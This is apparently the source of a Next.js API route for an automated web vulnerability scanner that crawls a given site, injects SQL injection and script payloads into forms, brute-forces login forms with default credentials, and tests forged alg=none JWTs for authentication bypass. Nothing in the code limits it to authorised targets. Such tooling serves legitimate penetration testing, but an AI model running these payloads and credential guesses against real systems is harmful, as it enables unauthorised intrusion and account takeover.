import axios from "axios";
import * as cheerio from "cheerio";
import Crawler from "crawler";
import { NextResponse } from "next/server";
import { URL } from "url";
import * as jwt from "jsonwebtoken"; // For tampering/manipulating JWT

// ------------------------
// Constants
// ------------------------
const USER_LIST = ["root", "admin"];
const PASSWORD_LIST = ["123456", "password", "12345678"];
const SQLI_PAYLOADS = [
  "' OR '1'='1' -- ",
  "' UNION SELECT '57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING', NULL -- ",
];
const PARAM_TAMPERING_PAYLOADS = [
  "9999",
  "1 OR 1=1",
  "<script>alert('x')</script>",
];

// ------------------------
// In-memory storage
// ------------------------
const visitedUrls = new Map(); // URL -> cheerio object
const securityFindings = [];
const recordedFindings = new Set(); // For deduplicating across all notes

// ------------------------
// Enhanced noteFinding (with deduplication)
// ------------------------
/**
 * Record a security-related finding, avoiding duplicates.
 *
 * We create a "signature" that identifies the uniqueness of a finding
 * based on (type, domain, detail). If that signature already exists,
 * we do not add it again.
 *
 * @param {string} type - The short code for the vulnerability category (e.g. 'insecure_transport')
 * @param {string} url - The URL where this was observed
 * @param {string} detail - A short explanation or data point
 * @param {object} [options] - Additional metadata (confidence, severity, etc.)
 *    e.g., { confidence: 'high', severity: 'critical' }
 */
function noteFinding(type, url, detail, options = {}) {
  let domain;
  try {
    domain = new URL(url).hostname;
  } catch {
    // fallback if URL parsing fails
    domain = url;
  }

  // Create a signature to avoid repeating the same finding
  const signature = `${type}::${domain}::${detail}`;
  if (recordedFindings.has(signature)) {
    // It's already recorded; skip
    return;
  }
  recordedFindings.add(signature);

  const { confidence = "medium", severity = "medium" } = options;
  securityFindings.push({ type, url, detail, confidence, severity });
}

// ------------------------
// Utility / Helper Functions
// ------------------------
function normalizeUrl(href, base) {
  try {
    return new URL(href, base).href;
  } catch {
    return null;
  }
}

function isSameDomain(url, domain) {
  try {
    return new URL(url).hostname === domain;
  } catch {
    return false;
  }
}

// ------------------------
// Basic Broken Auth / Session Checks
// ------------------------
/**
 * 1. Check if the site is using HTTPS. If it’s pure HTTP and does not redirect, we note it as insecure.
 * 
 * We do a preliminary HEAD request to see if the site redirects to HTTPS 
 * before declaring an 'insecure_transport' finding.
 */
async function checkHTTPS(pageUrl) {
  if (pageUrl.toLowerCase().startsWith("https://")) {
    return;
  }
  try {
    const resp = await axios.head(pageUrl, { maxRedirects: 0 });
    // If we do not get a 301/302 to https, note the finding
    if (!resp.headers.location || !resp.headers.location.toLowerCase().startsWith("https://")) {
      noteFinding(
        "insecure_transport",
        pageUrl,
        "Site does not use HTTPS and does not redirect to HTTPS",
        { confidence: "high", severity: "high" }
      );
    }
  } catch (err) {
    // If HEAD fails or there's no redirect
    noteFinding(
      "insecure_transport",
      pageUrl,
      "Site does not use HTTPS (HEAD check failed)",
      { confidence: "medium", severity: "medium" }
    );
  }
}

/**
 * 2. Check if credentials appear in URL query parameters. 
 * We do simple pattern matching for 'token', 'auth', 'password', etc.
 */
function checkCredentialsInUrl(pageUrl) {
  try {
    const parsed = new URL(pageUrl);
    for (const [key, val] of parsed.searchParams.entries()) {
      const kLower = key.toLowerCase();
      const vLower = val.toLowerCase();

      // Heuristic: skip if param is obviously not sensitive
      if (kLower.includes("pagetoken") || kLower.includes("csrftoken")) {
        continue;
      }

      if (
        /(token|session|auth|passwd|password)/i.test(kLower) ||
        /(token|session|auth|passwd|password)/i.test(vLower)
      ) {
        noteFinding(
          "credentials_in_url",
          pageUrl,
          `Parameter appears to contain credential/session info: ${key}=${val}`,
          { confidence: "medium", severity: "medium" }
        );
      }
    }
  } catch {
    // parse error
  }
}

/**
 * 3. Check for a password reset route. 
 */
function checkForPasswordReset(pageUrl) {
  const lowerUrl = pageUrl.toLowerCase();
  if (lowerUrl.includes("forgot") || lowerUrl.includes("reset")) {
    noteFinding(
      "potential_insecure_reset",
      pageUrl,
      "Detected route that may be a password reset flow",
      { confidence: "low", severity: "low" }
    );
  }
}

/**
 * 4. Check cookies for missing HttpOnly/Secure flags or suspicious session usage.
 *    We unify multiple missing flags into a single note, so that
 *    "Cookie 'PHPSESSID' missing flags: Secure, HttpOnly" only appears once.
 */
function checkCookiesForSecurityFlags(setCookieHeader, pageUrl) {
  if (!setCookieHeader) return;
  const domain = new URL(pageUrl).hostname;
  const cookieArray = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];

  cookieArray.forEach((cookieStr) => {
    const lower = cookieStr.toLowerCase();

    // Extract cookie name (e.g. "PHPSESSID")
    const matchName = cookieStr.match(/^([^=]+)=/);
    if (!matchName) return;
    const cookieName = matchName[1].trim();

    // If it's likely a session/auth cookie
    if (/(session|auth|jwt|sid)/i.test(cookieName)) {
      const missingFlags = [];

      // If domain is not localhost and no secure flag
      if (!lower.includes("secure") && domain !== "localhost") {
        missingFlags.push("Secure");
      }
      // If there's no HttpOnly
      if (!lower.includes("httponly")) {
        missingFlags.push("HttpOnly");
      }

      // If any flags are missing, record as a single combined finding
      if (missingFlags.length > 0) {
        noteFinding(
          "insecure_cookie",
          pageUrl,
          `Cookie '${cookieName}' missing flags: ${missingFlags.join(", ")}`,
          { confidence: "high", severity: "medium" }
        );
      }
    }
  });
}

// ------------------------
// JWT Exploitation
// ------------------------
function parseJWTFromCookie(setCookieHeader) {
  if (!setCookieHeader) return null;
  const cookieArray = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
  for (const cookieStr of cookieArray) {
    const match = cookieStr.match(/jwt=([^;]+)/i);
    if (match) {
      return match[1];
    }
  }
  return null;
}

/**
 * Attempt to tamper a JWT by removing the signature and setting alg=none. 
 * If the server does not reject, we raise a high-confidence finding.
 */
async function attemptJWTExploitation(originalToken, pageUrl, requestRestrictedFn) {
  try {
    const decoded = jwt.decode(originalToken, { complete: true });
    if (!decoded) return;

    const tamperedHeader = { alg: "none", typ: "JWT" };
    const payloadObj = decoded.payload;

    const toBase64Url = (obj) =>
      Buffer.from(JSON.stringify(obj))
        .toString("base64")
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=/g, "");

    const tamperedToken = `${toBase64Url(tamperedHeader)}.${toBase64Url(payloadObj)}.`; // no signature

    const tamperedResp = await requestRestrictedFn(tamperedToken);
    const status = tamperedResp.status;

    if (status >= 200 && status < 300) {
      noteFinding(
        "improper_jwt_handling",
        pageUrl,
        "Server accepted a tampered/unsigned JWT (alg=none)",
        { confidence: "high", severity: "high" }
      );
    } else if (status === 302) {
      // Possibly a successful redirect to a restricted page
      const location = tamperedResp.headers.location || "";
      if (location.toLowerCase().includes("/dashboard") || location.toLowerCase().includes("/admin")) {
        noteFinding(
          "improper_jwt_handling",
          pageUrl,
          "Server redirected to protected resource with a tampered/unsigned JWT",
          { confidence: "high", severity: "critical" }
        );
      }
    }
    // If 401 or 403, the server properly rejected the token (no finding).
  } catch (err) {
    console.warn("[JWT Exploit Error]", err.message);
  }
}

// ------------------------
// SQL / Pattern Detection
// ------------------------
function detectTestingStringResponses($) {
  const html = $.html();
  const target = "57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING";
  const regex = /'\s*UNION\s*SELECT.*57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING.*--/i;

  const occurrences = html.match(new RegExp(target, "g")) || [];
  const fullMatches = html.match(regex) || [];

  if (occurrences.length > fullMatches.length) {
    return { type: "testing_string_response", data: [target] };
  }
  return null;
}

function detectSQLInjectionResponses($) {
  const results = [];
  $("pre").each((_, el) => {
    const txt = $(el).text().trim();
    // A naive example: if we see something like "ID: 'someinput' --"
    if (/ID:\s*'[^']*--/.test(txt)) {
      results.push(txt);
    }
  });
  return results.length ? { type: "sql_injection_response", data: results } : null;
}

function detectPatterns($) {
  const detections = [detectSQLInjectionResponses, detectTestingStringResponses]
    .map((fn) => fn($))
    .filter(Boolean);

  if (detections.length > 1) {
    return { combined: true, detections, confidence: "high", severity: "high" };
  } else if (detections.length === 1) {
    return { combined: false, detections, confidence: "medium", severity: "medium" };
  }
  return null;
}

// ------------------------
// CSRF / Form checks
// ------------------------
function checkFormForCSRFToken($form) {
  const hiddenCsrf = $form.find(
    "input[type='hidden'][name*='csrf'], input[type='hidden'][name*='token']"
  ).length;
  return hiddenCsrf > 0;
}

function isLikelyLoginForm($form, $) {
  let hasPassword = false;
  let hasUserField = false;
  $form.find("input").each((_, el) => {
    const type = ($(el).attr("type") || "").toLowerCase();
    const name = ($(el).attr("name") || "").toLowerCase();
    if (type === "password") hasPassword = true;
    if (name.includes("user") || name.includes("email") || type === "text" || type === "email") {
      hasUserField = true;
    }
  });
  return hasPassword && hasUserField;
}

// ------------------------
// Brute Force & Rate Limit
// ------------------------
let attemptsCount = 0;
let rateLimitDetected = false;
let accountLockoutDetected = false;
let progressiveDelayDetected = false;
const requestTimes = []; // for measuring progressive delay

function detectCaptcha(resp) {
  const html = (resp.data || "").toLowerCase();
  const $ = cheerio.load(resp.data);

  return (
    $('[class*="captcha"]').length > 0 ||
    $('[id*="captcha"]').length > 0 ||
    $('img[src*="captcha"]').length > 0 ||
    html.includes("captcha") ||
    $('div[class*="g-recaptcha"]').length > 0
  );
}

function detectAccountLockout(resp) {
  const html = (resp.data || "").toLowerCase();
  const status = resp.status;

  if (status === 403) {
    return true; // "Forbidden" might indicate a lockout
  }

  const accountLockedPatterns = [
    /account.*locked/i,
    /locked.*account/i,
    /too many.*attempts/i,
    /temporarily blocked/i,
    /verrouill/i,
    /bloqu/i,
    /trop de tentatives/i,
  ];
  return accountLockedPatterns.some((pattern) => pattern.test(html));
}

function isPotentiallySuccessfulLogin(resp) {
  const html = (resp.data || "").toLowerCase();
  const headers = resp.headers || {};
  const status = resp.status;

  const failureKeywords = [
    "invalid",
    "incorrect",
    "login failed",
    "wrong password",
    "authentication failed",
  ];
  const successKeywords = [
    "logout",
    "welcome",
    "dashboard",
    "you are logged in",
    "my account",
    "sign out",
  ];

  const hasFailureIndicators = failureKeywords.some((kw) => html.includes(kw));
  const hasSuccessIndicators = successKeywords.some((kw) => html.includes(kw));

  // Check cookie flags for each response
  checkCookiesForSecurityFlags(headers["set-cookie"], resp.config?.url || "N/A");

  // If there's a session-like cookie
  const setCookieHeader = headers["set-cookie"];
  const hasSessionCookie = Array.isArray(setCookieHeader)
    ? setCookieHeader.some((c) => /session|auth|jwt|sid/i.test(c))
    : false;

  // Check for known login redirect
  const isRedirectToSafePage =
    headers["location"] &&
    ["/dashboard", "/account", "/home"].some((p) => headers["location"]?.toLowerCase()?.includes(p));

  let score = 0;
  if (status >= 200 && status < 300) score += 1;
  if (hasSuccessIndicators) score += 2;
  if (hasSessionCookie) score += 2;
  if (status === 302 && isRedirectToSafePage) score += 1;

  return !hasFailureIndicators && score >= 3;
}

function checkProgressiveDelay() {
  if (requestTimes.length < 6) return; // Need enough data points

  const half = Math.floor(requestTimes.length / 2);
  const firstHalf = requestTimes.slice(0, half);
  const secondHalf = requestTimes.slice(half);

  const avg = (arr) => arr.reduce((a, b) => a + b, 0) / arr.length;
  const avgFirst = avg(firstHalf);
  const avgSecond = avg(secondHalf);

  // If second half is 1.5x the first half, we consider it progressive delay
  if (avgSecond > avgFirst * 1.5 && !progressiveDelayDetected) {
    progressiveDelayDetected = true;
    noteFinding(
      "progressive_delay_detected",
      "N/A",
      `Response time increased from ~${avgFirst.toFixed(2)}ms to ~${avgSecond.toFixed(2)}ms`,
      { confidence: "high", severity: "medium" }
    );
  }
}

async function bruteForceLogin(url, method, data, fields, requestFn) {
  const usernameField = Object.entries(fields).find(([name]) =>
    ["user", "email", "username"].some((kw) => name.toLowerCase().includes(kw))
  )?.[0];

  const passwordField = Object.entries(fields).find(([_, type]) => type === "password")?.[0];

  if (!usernameField || !passwordField) {
    console.warn(`[BRUTE SKIPPED] Missing username or password fields for ${url}`);
    return [];
  }

  const successfulAttempts = [];

  for (const user of USER_LIST) {
    for (const pass of PASSWORD_LIST) {
      const payload = { ...data, [usernameField]: user, [passwordField]: pass };
      if (!payload[usernameField] || !payload[passwordField]) continue;

      attemptsCount++;

      const startTime = Date.now();
      try {
        const resp = await requestFn(url, method, payload);
        const endTime = Date.now();
        const elapsed = endTime - startTime;
        requestTimes.push(elapsed);
        checkProgressiveDelay();

        // 1) Rate limit detection
        if (resp.status === 429) {
          rateLimitDetected = true;
          noteFinding(
            "rate_limit_detected",
            url,
            "429 Too Many Requests encountered",
            { confidence: "high", severity: "medium" }
          );
          break;
        }

        // 2) Captcha detection
        if (detectCaptcha(resp)) {
          noteFinding(
            "captcha_detected",
            url,
            "Possible captcha found after repeated login attempts",
            { confidence: "high", severity: "medium" }
          );
          // Optionally break if needed
        }

        // 3) Account lockout detection
        if (detectAccountLockout(resp) && !accountLockoutDetected) {
          accountLockoutDetected = true;
          noteFinding(
            "account_lockout_detected",
            url,
            "Server indicates account lockout after repeated attempts",
            { confidence: "high", severity: "medium" }
          );
          break;
        }

        // If potentially successful
        if (isPotentiallySuccessfulLogin(resp)) {
          noteFinding(
            "default_or_weak_creds",
            url,
            `Logged in with a known weak credential: ${user}:${pass}`,
            { confidence: "high", severity: "high" }
          );
          successfulAttempts.push({ username: user, password: pass, url, status: resp.status });
        }
      } catch (err) {
        console.error(`[BRUTE ERROR] ${user}:${pass} - ${err.message}`);
      }
    }
    if (rateLimitDetected || accountLockoutDetected) break;
  }

  if (
    !rateLimitDetected &&
    !accountLockoutDetected &&
    attemptsCount > USER_LIST.length * PASSWORD_LIST.length
  ) {
    noteFinding(
      "no_rate_limit_detected",
      url,
      "No 429 or lockout after many brute-force attempts",
      { confidence: "medium", severity: "medium" }
    );
  }

  return successfulAttempts;
}

// ------------------------
// Form Submissions
// ------------------------
function extractForms($, pageUrl) {
  return $("form")
    .map((_, form) => {
      const $form = $(form);
      const method = ($form.attr("method") || "GET").toUpperCase();
      const action = $form.attr("action") || pageUrl;
      const inputs = $form.find("input, textarea, select");

      const formData = {};
      const formInputs = {};
      inputs.each((_, el) => {
        const name = $(el).attr("name");
        if (!name) return;
        formData[name] = $(el).attr("value") || "";
        formInputs[name] = ($(el).attr("type") || "").toLowerCase();
      });

      return {
        method,
        actionUrl: new URL(action, pageUrl).href.replace(/#$/, ""),
        formData,
        formInputs,
        isLogin: isLikelyLoginForm($form, $),
        hasCSRFToken: checkFormForCSRFToken($form),
      };
    })
    .get();
}

async function submitFormWithPayloads(form, requestFn) {
  const { actionUrl, method, formData } = form;
  const found = [];

  const targetField = Object.keys(formData)[0];
  if (!targetField) return found;

  const allPayloads = [...SQLI_PAYLOADS, ...PARAM_TAMPERING_PAYLOADS];

  for (const payload of allPayloads) {
    const injected = { ...formData, [targetField]: payload };
    try {
      const resp = await requestFn(actionUrl, method, injected);
      const $ = cheerio.load(resp.data);
      const result = detectPatterns($);

      if (result) {
        if (result.detections) {
          const detectionTypes = result.detections.map((d) => d.type);
          noteFinding(
            "possible_injection_response",
            actionUrl,
            `Payload: "${payload}" triggered patterns: ${detectionTypes.join(", ")}`,
            {
              confidence: result.confidence || "medium",
              severity: result.severity || "medium",
            }
          );
        } else {
          noteFinding(
            "possible_injection_response",
            actionUrl,
            `Payload: "${payload}" triggered injection-like pattern`,
            {
              confidence: "medium",
              severity: "medium",
            }
          );
        }
        found.push({ url: actionUrl, payload });
      }
    } catch (err) {
      console.error(`[PAYLOAD FAIL] ${actionUrl}`, err.message);
    }
  }
  return found;
}

async function processForms($, url, requestFn, attemptRestrictedFn) {
  const forms = extractForms($, url);
  const sqlHits = [];
  const bruteForceResults = [];

  for (const form of forms) {
    // If it looks like a login form but no hidden CSRF token
    if (form.isLogin && !form.hasCSRFToken) {
      noteFinding(
        "csrf_token_missing",
        form.actionUrl,
        "No hidden CSRF token found in a likely login form",
        { confidence: "medium", severity: "medium" }
      );
    }

    // Attempt SQLi / param tampering
    const hits = await submitFormWithPayloads(form, requestFn);
    if (hits.length > 0) {
      sqlHits.push(...hits.map((h) => h.url));
    }

    // Attempt brute-forcing if it’s a login form
    if (form.isLogin) {
      const bfAttempts = await bruteForceLogin(
        form.actionUrl,
        form.method,
        form.formData,
        form.formInputs,
        requestFn
      );
      bruteForceResults.push(...bfAttempts);

      // If we have successful logins, check for JWT
      for (const success of bfAttempts) {
        try {
          const loginResp = await requestFn(success.url, form.method, form.formData);
          const setCookie = loginResp.headers?.["set-cookie"];
          const foundJwt = parseJWTFromCookie(setCookie);

          if (foundJwt) {
            await attemptJWTExploitation(foundJwt, url, async (tamperedToken) => {
              return requestFnWithJWT(success.url, tamperedToken);
            });
          }
        } catch (jwtErr) {
          console.error("[JWT Handling Error]", jwtErr.message);
        }
      }
    }
  }
  return { sqlHits, bruteForceResults };
}

// ------------------------
// Additional Request Utils
// ------------------------
async function requestFn(url, method, data) {
  const config = {
    maxRedirects: 0,
    validateStatus: (status) => status < 400 || [302, 429].includes(status),
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
  };

  try {
    if (method === "POST") {
      return await axios.post(url, new URLSearchParams(data), config);
    } else {
      const qs = new URLSearchParams(data).toString();
      return await axios.get(`${url}?${qs}`, config);
    }
  } catch (error) {
    if (error.response && [302, 429].includes(error.response.status)) {
      return error.response; // handle redirect or rate-limit as success
    }
    throw error;
  }
}

async function requestFnWithJWT(url, tamperedToken) {
  const config = {
    maxRedirects: 0,
    validateStatus: (status) => status < 400 || status === 302,
    headers: {
      Cookie: `jwt=${tamperedToken}`,
    },
  };
  return axios.get(url, config);
}

// ------------------------
// Crawler
// ------------------------
function extractLinks($, domain, baseUrl) {
  const links = new Set();
  $("a").each((_, el) => {
    const href = $(el).attr("href");
    const fullUrl = normalizeUrl(href, baseUrl);
    if (
      fullUrl &&
      isSameDomain(fullUrl, domain) &&
      !fullUrl.match(/\.(jpg|png|svg|yml|yaml)$/i)
    ) {
      links.add(fullUrl);
    }
  });
  return [...links];
}

async function startCrawler(startUrl) {
  return new Promise((resolve) => {
    const foundUrls = new Set();
    const domain = new URL(startUrl).hostname;

    const crawler = new Crawler({
      maxConnections: 10,
      retries: 3,
      callback: async (err, res, done) => {
        const pageUrl = res.options?.url;
        if (!err && res.$ && pageUrl && !visitedUrls.has(pageUrl)) {
          visitedUrls.set(pageUrl, res.$);
          foundUrls.add(pageUrl);

          await checkHTTPS(pageUrl);
          checkForPasswordReset(pageUrl);
          checkCredentialsInUrl(pageUrl);

          // Gather new links
          for (const link of extractLinks(res.$, domain, pageUrl)) {
            if (!visitedUrls.has(link)) {
              crawler.queue(link);
            }
          }
        } else if (err) {
          console.error(`[Crawler Error] ${pageUrl}: ${err.message}`);
        }
        done();
      },
    });

    crawler.queue(startUrl);
    crawler.on("drain", () => resolve([...foundUrls]));
  });
}

// ------------------------
// API Handler
// ------------------------
export async function POST(req) {
  const { startUrl } = await req.json();
  if (!startUrl) {
    return NextResponse.json({ error: "Missing startUrl" }, { status: 400 });
  }

  try {
    console.log("[API] Starting crawler for", startUrl);
    const crawledUrls = await startCrawler(startUrl);
    console.log("[API] Crawler finished, found URLs:", crawledUrls.length);

    const sqlHitUrls = [];
    const bruteForceResults = [];

    for (const url of crawledUrls) {
      const $ = visitedUrls.get(url);
      if (!$) continue;

      // For each page, process forms for SQLi, brute-forcing, and JWT exploitation
      const { sqlHits, bruteForceResults: bfResults } = await processForms(
        $,
        url,
        requestFn
      );
      if (sqlHits.length > 0) {
        sqlHitUrls.push(...sqlHits);
      }
      if (bfResults.length > 0) {
        bruteForceResults.push(...bfResults);
      }
    }

    return NextResponse.json({
      crawledUrls,
      sqlHitUrls,
      bruteForceResults,
      securityFindings,
    });
  } catch (err) {
    console.error("[API Error]", err);
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
